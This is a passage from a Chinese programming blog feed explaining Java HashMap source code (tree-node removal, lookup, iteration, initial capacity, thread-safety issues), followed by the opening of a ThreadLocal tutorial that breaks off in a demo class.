class="line"></span><br><span class="line">        <span class="comment">//这里开始进行树的操作</span></span><br><span class="line">        <span class="keyword">if</span> (root.parent != <span class="keyword">null</span>)</span><br><span class="line">            root = root.root(); <span class="comment">//若当前的root节点不是树的根节点，则通过root()方法找到树的根节点</span></span><br><span class="line">        <span class="keyword">if</span> (root == <span class="keyword">null</span> || root.right == <span class="keyword">null</span> ||</span><br><span class="line">            (rl = root.left) == <span class="keyword">null</span> || rl.left == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//上面if中一堆条件，满足就说明桶中的这棵树太小了，没有存在的必要</span></span><br><span class="line">            <span class="comment">//这时进行非树化操作，对于TreeNode.untreeify方法后面会有详述</span></span><br><span class="line">            tab[index] = first.untreeify(map);  <span class="comment">// too small</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//桶中的树还有存在的必要, p赋值为当前节点</span></span><br><span class="line">        TreeNode&lt;K,V&gt; p = <span class="keyword">this</span>, pl = left, pr = right, replacement;</span><br><span class="line">        <span class="comment">//下面需要找到一个节点replacement来接替待删除节点p的位置</span></span><br><span class="line">        <span class="comment">//在红黑树解析的那篇文章中我们给出了策略，即若p为叶子节点，则直接删除；</span></span><br><span class="line">        <span class="comment">//否则若只有左孩子或右孩子，则其左孩子或右孩子上位；</span></span><br><span class="line">        <span class="comment">//否则若同时拥有左右子树，则选择左子树中最大的节点或右子树中最小的节点上位。</span></span><br><span class="line">        <span class="keyword">if</span> (pl != <span class="keyword">null</span> &amp;&amp; pr != <span class="keyword">null</span>) &#123; <span class="comment">//若p的左右孩子都存在</span></span><br><span class="line">            TreeNode&lt;K,V&gt; s = pr, sl; <span class="comment">//s为p的右孩子，这里选择了右子树中最小的节点作为继承节点</span></span><br><span class="line">            <span class="keyword">while</span> ((sl = s.left) != <span class="keyword">null</span>) <span class="comment">// find successor</span></span><br><span class="line">                s = sl; <span class="comment">//右子树中最左的孩子，即最小的节点</span></span><br><span class="line">            <span class="keyword">boolean</span> c = s.red; s.red = p.red; p.red = c; <span class="comment">// swap colors</span></span><br><span class="line">            TreeNode&lt;K,V&gt; sr = s.right; <span class="comment">//p的右子树中最小节点s的右孩子，记为sr</span></span><br><span class="line">            TreeNode&lt;K,V&gt; pp = p.parent; <span class="comment">//当前节点p的父节点，记为pp</span></span><br><span class="line">            <span class="keyword">if</span> (s == pr) &#123; <span class="comment">// p was s's direct parent</span></span><br><span class="line">                <span class="comment">//若执行至此，说明p的右子树pr没有左孩子，即pr节点就是p的右子树中最小的，则pr直接上位即可</span></span><br><span class="line">                p.parent = s;</span><br><span class="line">                s.right = p;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//否则的话，pr中的最左孩子s上位，s的右子树成为其父节点sp的左子树</span></span><br><span class="line">                TreeNode&lt;K,V&gt; sp = s.parent; </span><br><span class="line">                <span class="keyword">if</span> ((p.parent = sp) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (s == sp.left)</span><br><span class="line">                        sp.left = p;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        sp.right = p;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ((s.right = pr) != <span class="keyword">null</span>)</span><br><span class="line">                    pr.parent = s;</span><br><span class="line">            &#125;</span><br><span class="line">            p.left = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> ((p.right = sr) != <span class="keyword">null</span>)</span><br><span class="line">                sr.parent = p;</span><br><span class="line">            <span class="keyword">if</span> ((s.left = pl) != <span class="keyword">null</span>)</span><br><span class="line">                pl.parent = s; <span class="comment">//s上位后，pl成为其左子树</span></span><br><span class="line">            <span class="keyword">if</span> ((s.parent = pp) == <span class="keyword">null</span>) </span><br><span class="line">                root = s; <span class="comment">//s认p之前的父节点pp为自己新的父节点，若pp为空，则s为根节点</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (p == pp.left) <span class="comment">//若pp不为空，则根据实际情况认s为自己新的左子树或右子树，替代p</span></span><br><span class="line">                pp.left = s;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                pp.right = s;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//这里需要解释一下，此处记录的replacement并非对于原先待删除节点p的继承者（即上文中的s）</span></span><br><span class="line">            <span class="comment">//而是指对于p右子树pr中的最左节点，也即上文中s的位置的继承者（因为s被上移去继承p，自然要有人来继承s）</span></span><br><span class="line">            <span class="comment">//按照我们一开始给出的调整策略，如果s有右子树sr，则应该由sr来继承s的位置；否则无人继承，则暂记为p</span></span><br><span class="line">            <span class="comment">//可以看出这个replacement变量是为了之后红黑树的删除调整准备的，它记录的是树经过上述调整后最终变化的地方</span></span><br><span class="line">            <span class="keyword">if</span> (sr != <span class="keyword">null</span>) </span><br><span class="line">                replacement = sr;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                replacement = p;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (pl != <span class="keyword">null</span>)</span><br><span class="line">            replacement = pl; <span class="comment">//若p只有左子树，则左子树直接上位，replacement置为pl</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (pr != <span class="keyword">null</span>)</span><br><span class="line">            replacement = pr; <span class="comment">//若p只有右子树，则右子树直接上位，replacement置为pr</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            replacement = p; <span class="comment">//若p本身就是叶子节点，则无人继承其位置，暂记replacement为p</span></span><br><span class="line">        <span class="keyword">if</span> (replacement != p) &#123;</span><br><span class="line">            <span class="comment">//若replacement不为p，则让继承者跟新的父节点相认</span></span><br><span class="line">            TreeNode&lt;K,V&gt; pp = replacement.parent = p.parent;</span><br><span class="line">            <span class="keyword">if</span> (pp == <span class="keyword">null</span>)</span><br><span class="line">                root = replacement;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (p == pp.left)</span><br><span class="line">                pp.left = replacement;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                pp.right = replacement;</span><br><span class="line">            p.left = p.right = p.parent = <span class="keyword">null</span>; <span class="comment">//清空p的指针</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//若p为红色，则删除后不会破坏红黑树的平衡，无需调整；否则的话需通过balanceDeletion方法进行删除后调整</span></span><br><span class="line">        <span class="comment">//该方法的具体源码在&lt;&lt;红黑树(Red-Black-Tree)解析&gt;&gt;一文中已有详述，请戳本文开头处的链接哈</span></span><br><span class="line">        TreeNode&lt;K,V&gt; r = p.red ? root : balanceDeletion(root, replacement);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//如果p为叶子节点，则在此处做删除工作，断开指针连接</span></span><br><span class="line">        <span class="keyword">if</span> (replacement == p) &#123;  <span class="comment">// detach</span></span><br><span class="line">            TreeNode&lt;K,V&gt; pp = p.parent;</span><br><span class="line">            p.parent = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (pp != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (p == pp.left)</span><br><span class="line">                    pp.left = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (p == pp.right)</span><br><span class="line">                    pp.right = <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (movable)</span><br><span class="line">            moveRootToFront(tab, r);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="查找元素方法-get"><a href="#查找元素方法-get" class="headerlink" title="查找元素方法(get)"></a>查找元素方法(get)</h4><p> 查找方法，通过元素的Key找到Value。 </p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    Node&lt;K,V&gt; e;</span><br><span class="line">    <span class="keyword">return</span> (e = getNode(hash(key), key)) == <span class="keyword">null</span> ? <span class="keyword">null</span> : e.value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>get方法主要调用的是getNode方法，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">final</span> Node&lt;K,V&gt; <span class="title">getNode</span><span class="params">(<span class="keyword">int</span> hash, Object key)</span> </span>&#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; first, e; <span class="keyword">int</span> n; K k;</span><br><span class="line">    <span class="comment">//如果哈希表不为空并且key对应的桶上不为空</span></span><br><span class="line">    <span class="keyword">if</span> ((tab = table) != <span class="keyword">null</span> &amp;&amp; (n = tab.length) &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">        (first = tab[(n - <span class="number">1</span>) &amp; hash]) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">/* </span></span><br><span class="line"><span class="comment">        判断数组元素是否相等</span></span><br><span class="line"><span class="comment">        根据索引的位置检查第一个元素</span></span><br><span class="line"><span class="comment">        注意：总是检查第一个元素</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (first.hash == hash &amp;&amp; <span class="comment">// always check first node</span></span><br><span class="line">            ((k = first.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">            <span class="keyword">return</span> first;</span><br><span class="line">        <span class="comment">// 如果不是第一个元素，判断是否有后续节点</span></span><br><span class="line">        <span class="keyword">if</span> ((e = first.next) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 判断是否是红黑树，是的话调用红黑树中的getTreeNode方法获取节点</span></span><br><span class="line">            <span class="keyword">if</span> (first <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                <span class="keyword">return</span> ((TreeNode&lt;K,V&gt;)first).getTreeNode(hash, key);</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="comment">// 不是红黑树的话，那就是链表结构了，通过循环的方法判断链表中是否存在该key</span></span><br><span class="line">                <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                    ((k = e.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                    <span class="keyword">return</span> e;</span><br><span class="line">            &#125; <span class="keyword">while</span> ((e = e.next) != <span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>小结：</p><p>1.get方法实现的步骤：</p><p>​    1）通过hash值获取该key映射到的桶</p><p>​    2）桶上的key就是要查找的key,则直接找到并返回</p><p>​    3）桶上的key不是要找的key,则查看后续的节点：</p><p>​            a:如果后续节点是红黑树节点，通过调用红黑树的方法根据key获取value</p><p>​            b:如果后续节点是链表节点，则通过循环遍历链表根据key获取value</p><p>2.上述红黑树节点调用的是getTreeNode方法通过树形节点的find方法进行查找：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> TreeNode&lt;K,V&gt; <span class="title">getTreeNode</span><span class="params">(<span class="keyword">int</span> h, Object k)</span> </span>&#123;</span><br><span class="line">           <span class="keyword">return</span> ((parent != <span class="keyword">null</span>) ? root() : <span class="keyword">this</span>).find(h, k, <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">final</span> TreeNode&lt;K,V&gt; <span class="title">find</span><span class="params">(<span class="keyword">int</span> h, Object k, Class&lt;?&gt; kc)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//p赋值为根节点，并从根节点开始遍历</span></span><br><span class="line">           TreeNode&lt;K,V&gt; p = <span class="keyword">this</span>;</span><br><span class="line">           <span class="keyword">do</span> &#123;</span><br><span class="line">               <span class="keyword">int</span> ph, dir; K pk;</span><br><span class="line">               TreeNode&lt;K,V&gt; pl = p.left, pr = p.right, q;</span><br><span class="line">               <span class="comment">//查找的hash值h比当前节点p的hash值ph小</span></span><br><span class="line">               <span class="keyword">if</span> ((ph = p.hash) &gt; h)</span><br><span class="line">                    <span class="comment">//在p的左子树中继续查找</span></span><br><span class="line">                   p = pl;</span><br><span class="line">               <span class="keyword">else</span> <span class="keyword">if</span> (ph &lt; h)</span><br><span class="line">                   <span class="comment">//反之在p的右子树中继续查找</span></span><br><span class="line">                   p = pr;</span><br><span class="line">                <span class="comment">//若两节点hash值相等，且节点的key也相等，则匹配成功，返回p</span></span><br><span class="line">               <span class="keyword">else</span> <span class="keyword">if</span> ((pk = p.key) == k || (k != <span class="keyword">null</span> &amp;&amp; k.equals(pk)))</span><br><span class="line">                   <span class="keyword">return</span> p;</span><br><span class="line">               </span><br><span class="line">               <span class="comment">/***---- 下面的情况是节点p的hash值和h相等，但key不匹配，需继续在p的子树中寻找 ----****/</span></span><br><span class="line">               <span class="comment">//若p的左子树为空，则直接在右子树寻找。若右子树也为空，则会不满足循环条件，返回null，即未找到</span></span><br><span class="line">               <span class="keyword">else</span> <span class="keyword">if</span> (pl == <span class="keyword">null</span>)</span><br><span class="line">                   p = pr;</span><br><span class="line">               <span class="comment">//反之若左子树不为空，同时右子树为空，则继续在左子树中寻找</span></span><br><span class="line">               <span class="keyword">else</span> <span class="keyword">if</span> (pr == <span class="keyword">null</span>)</span><br><span class="line">                   p = pl;</span><br><span class="line">               <span class="comment">//若k的比较函数kc不为空，且k是可比较的，则根据k和pk的比较结果来决定继续在p的哪个子树中寻找</span></span><br><span class="line">               <span class="keyword">else</span> <span class="keyword">if</span> ((kc != <span class="keyword">null</span> ||</span><br><span class="line">                         (kc = comparableClassFor(k)) != <span class="keyword">null</span>) &amp;&amp;</span><br><span class="line">                        (dir = compareComparables(kc, k, pk)) != <span class="number">0</span>)</span><br><span class="line">                   <span class="comment">//若k的比较函数kc不为空，且k是可比较的，则根据k和pk的比较结果来决定继续在p的哪个子树中寻找</span></span><br><span class="line">                   p = (dir &lt; <span class="number">0</span>) ? pl : pr;</span><br><span class="line">               <span class="comment">//递归查找</span></span><br><span class="line">               <span class="comment">//若k不可比，则只能分别去p的左右子树中碰运气了，先在p的右子树pr中寻找，结果为q</span></span><br><span class="line">               <span class="keyword">else</span> <span class="keyword">if</span> ((q = pr.find(h, k, kc)) != <span class="keyword">null</span>)</span><br><span class="line">                   <span class="comment">//若q不为空，代表匹配成功，则返回q，结束</span></span><br><span class="line">                   <span class="keyword">return</span> q;</span><br><span class="line">               <span class="keyword">else</span></span><br><span class="line">                   <span class="comment">//到这里表示未能在p的右子树中匹配成功，则在左子树中继续</span></span><br><span class="line">                   p = pl;</span><br><span class="line">           &#125; <span class="keyword">while</span> (p != <span class="keyword">null</span>);</span><br><span class="line">    <span class="comment">//各种寻找均无果，返回null，表示查找失败</span></span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>3.查找红黑树，由于之前添加时已经保证这个树是有序的了，因此查找时基本就是折半查找，效率更高。</p><p>4.这里和插入时一样，如果对比节点的哈希值和要查找的哈希值相等，就会判断key是否相等，相等就直接返回。不相等就从子树中递归查找。</p><p>5.</p><p>​    若为树，则在树中通过key.equals(k)查找，O(logn) </p><p>​    若为链表，则在链表中通过key.equals(k)查找，O(n)。</p><h4 id="遍历HashMap集合几种方式"><a href="#遍历HashMap集合几种方式" class="headerlink" title="遍历HashMap集合几种方式"></a>遍历HashMap集合几种方式</h4><p> 1、分别遍历Key和Values </p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210615105024.png" alt="image-20210615105022071"></p><p>2、使用Iterator迭代器迭代 </p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210615105047.png" alt="image-20210615105045275"></p><p>3、通过get方式（不建议使用）</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210615105109.png" alt="image-20210615105107212"></p><p>说明：根据阿里开发手册，不建议使用这种方式，因为迭代两次。keySet获取Iterator一次，还有通过get又迭代一次。降低性能。</p><p>4.jdk8以后使用Map接口中的默认方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">default void forEach(BiConsumer&lt;? super K,? super V&gt; action) </span><br><span class="line">BiConsumer接口中的方法：</span><br><span class="line">void accept(T t, U u) 对给定的参数执行此操作。  </span><br><span class="line">参数 </span><br><span class="line">            t - 第一个输入参数 </span><br><span class="line">            u - 第二个输入参数</span><br></pre></td></tr></table></figure><p>遍历代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo02</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        HashMap&lt;String,String&gt; m1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">        m1.put(<span class="string">"001"</span>, <span class="string">"zhangsan"</span>);</span><br><span class="line">        m1.put(<span class="string">"002"</span>, <span class="string">"lisi"</span>);</span><br><span class="line">        m1.forEach((key,value)-&gt;&#123;</span><br><span class="line">            System.out.println(key+<span class="string">"---"</span>+value);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="如何设计多个非重复的键值对要存储HashMap的初始化？"><a href="#如何设计多个非重复的键值对要存储HashMap的初始化？" class="headerlink" title="如何设计多个非重复的键值对要存储HashMap的初始化？"></a>如何设计多个非重复的键值对要存储HashMap的初始化？</h2><h3 id="HashMap的初始化问题描述"><a href="#HashMap的初始化问题描述" class="headerlink" title="HashMap的初始化问题描述"></a>HashMap的初始化问题描述</h3><p>​    如果我们确切的知道我们有多少键值对需要存储，那么我们在初始化HashMap的时候就应该指定它的容量，以防止HashMap自动扩容，影响使用效率。</p><p>​    默认情况下HashMap的容量是16，但是，如果用户通过构造函数指定了一个数字作为容量，那么Hash会选择大于该数字的第一个2的幂作为容量。(3-&gt;4、7-&gt;8、9-&gt;16) .这点我们在上述已经进行过讲解。</p><p> 《阿里巴巴Java开发手册》中建议我们设置HashMap的初始化容量。 </p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210615094335.bmp" alt="image-20191117164748836"></p><p> 那么，为什么要这么建议？你有想过没有。 </p><p>当然，以上建议也是有理论支撑的。我们上面介绍过，HashMap的扩容机制，就是当达到扩容条件时会进行扩容。HashMap的扩容条件就是当HashMap中的元素个数（size）超过临界值（threshold）时就会自动扩容。在HashMap中，threshold = loadFactor * capacity。</p><p>所以，如果我们没有设置初始容量大小，随着元素的不断增加，HashMap会有可能发生多次扩容，而HashMap中的扩容机制决定了每次扩容都需要重建hash表，是非常影响性能的。</p><p>但是设置初始化容量，设置的数值不同也会影响性能，那么当我们已知HashMap中即将存放的KV个数的时候，容量设置成多少为好呢？</p><h3 id="HashMap中容量的初始化"><a href="#HashMap中容量的初始化" class="headerlink" title="HashMap中容量的初始化"></a>HashMap中容量的初始化</h3><p>当我们使用HashMap(int initialCapacity)来初始化容量的时候，jdk会默认帮我们计算一个相对合理的值当做初始容量。那么，是不是我们只需要把已知的HashMap中即将存放的元素个数直接传给initialCapacity就可以了呢？</p><p>关于这个值的设置，在《阿里巴巴Java开发手册》有以下建议：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210615094328.png" alt="image-20191117165438726"></p><p>也就是说，如果我们设置的默认值是7，经过Jdk处理之后，会被设置成8，但是，这个HashMap在元素个数达到 8*0.75 = 6的时候就会进行一次扩容，这明显是我们不希望见到的。我们应该尽量减少扩容。原因也已经分析过。</p><p>如果我们通过<strong>initialCapacity/ 0.75F + 1.0F</strong>计算，7/0.75 + 1 = 10 ,10经过Jdk处理之后，会被设置成16，这就大大的减少了扩容的几率。</p><p>当HashMap内部维护的哈希表的容量达到75%时（默认情况下），会触发rehash，而rehash的过程是比较耗费时间的。所以初始化容量要设置成<strong>initialCapacity/0.75 + 1</strong>的话，可以有效的减少冲突也可以减小误差。</p><p>所以，我可以认为，当我们明确知道HashMap中元素的个数的时候，把默认容量设置成<strong>initialCapacity/ 0.75F + 1.0F</strong>是一个在性能上相对好的选择，但是，同时也会牺牲些内存。</p><p>我们想要在代码中创建一个HashMap的时候，如果我们已知这个Map中即将存放的元素个数，给HashMap设置初始容量可以在一定程度上提升效率。</p><p>但是，JDK并不会直接拿用户传进来的数字当做默认容量，而是会进行一番运算，最终得到一个2的幂。原因也已经分析过。</p><p>但是，为了最大程度的避免扩容带来的性能消耗，我们建议可以把默认容量的数字设置成<strong>initialCapacity/ 0.75F + 1.0F</strong>。</p><h1 id="HashMap并发问题"><a href="#HashMap并发问题" class="headerlink" title="HashMap并发问题"></a>HashMap并发问题</h1><p>HashMap 的设计目标是简洁高效，没有采取任何措施保证 put、remove 操作的多线程安全。 HashMap 的 put 方法的操作对象要么是整个散列表，要么是某个哈希桶里的链表或红黑树，而这些过程都没有采取措施保证多线程安全。在这个复杂的逻辑过程中，任何一个线程在这个过程中改动了散列表的结构，都有可能造成另一个线程的操作失败。</p><p>Java8 中的 HashMap 多线程情况下可能出错的一个例子。1.8虽然没有了死链的问题，但还是存在size()问题，++size不是原子操作。</p><p>HashMap中的 size 表示总的map存储的node的个数。在每次进行put方法的的最后。存在这样的代码进行累加：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (++size &gt; threshold)</span><br><span class="line">            resize();</span><br></pre></td></tr></table></figure><img src="C:/Users/86158/AppData/Roaming/Typora/typora-user-images/image-20210616154524983.png" alt="image-20210616154524983" style="zoom:67%;" /><p>因为 ++size 并不是原子操作，在多个线程都执行这行代码，最后的结果大概率时不正确的。会存在丢失数据的情况。</p><p>ConcurrentHashMap 与 HashMap 相比，在高效率的基础上添加了对多线程安全的保证。为了这个多线程安全，ConcurrentHashMap 并没有采用 HashMap 的单散列表设计，而是引入了分段散列表来平衡多线程安全和高效率，核心思想就是尽量只锁住需要操作的散列表段，而不是整个散列表。</p><p>HashTable 与 ConcurentHashMap 相比，对并发的处理粗糙了许多，单纯地通过锁住整个散列表来保证多线程安全性。虽然在设计和实现上比 ConcurrentHashMap 简单了许多，但在效率上远远不及 ConcurrentHashMap，因此目前多线程情况下不建议使用 HashTable，只推荐使用 ConcurrentHashMap。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;HashMap集合简介&quot;&gt;&lt;a href=&quot;#HashMap集合简介&quot; class=&quot;headerlink&quot; title=&quot;HashMap集合简介&quot;&gt;&lt;/a&gt;HashMap集合简介&lt;/h2&gt;&lt;p&gt;​    HashMap基于哈希表的Map接口实现，是以key-va
      
    
    </summary>
    
    
      <category term="集合" scheme="https://blog.kaluna.top/categories/%E9%9B%86%E5%90%88/"/>
    
    
      <category term="HashMap" scheme="https://blog.kaluna.top/tags/HashMap/"/>
    
  </entry>
  
  <entry>
    <title>ThreadLocal全面解析</title>
    <link href="https://blog.kaluna.top/2021/06/14/ThreadLocal%E5%85%A8%E9%9D%A2%E8%A7%A3%E6%9E%90/"/>
    <id>https://blog.kaluna.top/2021/06/14/ThreadLocal%E5%85%A8%E9%9D%A2%E8%A7%A3%E6%9E%90/</id>
    <published>2021-06-14T14:20:30.616Z</published>
    <updated>2021-06-18T05:01:07.184Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ThreadLocal全面解析"><a href="#ThreadLocal全面解析" class="headerlink" title="ThreadLocal全面解析"></a>ThreadLocal全面解析</h1><p>之前草草看过《Java并发编程的艺术》，一直觉得自己并发这块学得不好，看到知乎推荐看慕课网的ThreadLocal，尝试看了一下，但是觉得太简略了，就去b站搜视频，黑马程序员讲的ThreadLocal真是太太浅显易懂了。</p><p>学习目标</p><ul><li>了解ThreadLocal的介绍</li><li>掌握ThreadLocal的运用场景</li><li>了解ThreadLocal的内部结构</li><li>了解ThreadLocal的核心方法源码</li><li>了解ThreadLocalMap的源码</li></ul><h1 id="ThreadLocal介绍"><a href="#ThreadLocal介绍" class="headerlink" title="ThreadLocal介绍"></a>ThreadLocal介绍</h1><h2 id="官方介绍"><a href="#官方介绍" class="headerlink" title="官方介绍"></a>官方介绍</h2><p> 从Java官方文档中的描述：ThreadLocal类用来提供线程内部的局部变量。这种变量在多线程环境下访问（通过get和set方法访问）时能保证各个线程的变量相对独立于其他线程内的变量。ThreadLocal实例通常来说都是private static类型的，用于关联线程和线程上下文。</p><p>我们可以得知 ThreadLocal 的作用是：提供线程内的局部变量，不同的线程之间不会相互干扰，这种变量在线程的生命周期内起作用，减少同一个线程内多个函数或组件之间一些公共变量传递的复杂度。</p><blockquote><p>总结：</p><p>线程并发: 在多线程并发的场景下<br>传递数据: 我们可以通过ThreadLocal在同一线程，不同组件中传递公共变量<br>线程隔离: 每个线程的变量都是独立的，不会互相影响</p></blockquote><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h3 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h3><p> 在使用之前,我们先来认识几个ThreadLocal的常用方法</p><table><thead><tr><th>方法声明</th><th>描述</th></tr></thead><tbody><tr><td>ThreadLocal()</td><td>创建ThreadLocal对象</td></tr><tr><td>public void set( T value)</td><td>设置当前线程绑定的局部变量</td></tr><tr><td>public T get()</td><td>获取当前线程绑定的局部变量</td></tr><tr><td>public void remove()</td><td>移除当前线程绑定的局部变量</td></tr></tbody></table><h3 id="使用案例"><a href="#使用案例" class="headerlink" title="使用案例"></a>使用案例</h3><p>我们来看下面这个案例 , 感受一下ThreadLocal 线程隔离的特点：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyDemo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String content;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">getContent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setContent</span><span class="params">(String content)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.content = content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        MyDemo demo = <span class="keyword">new</span> MyDemo();</span><br><span class="line">        <span 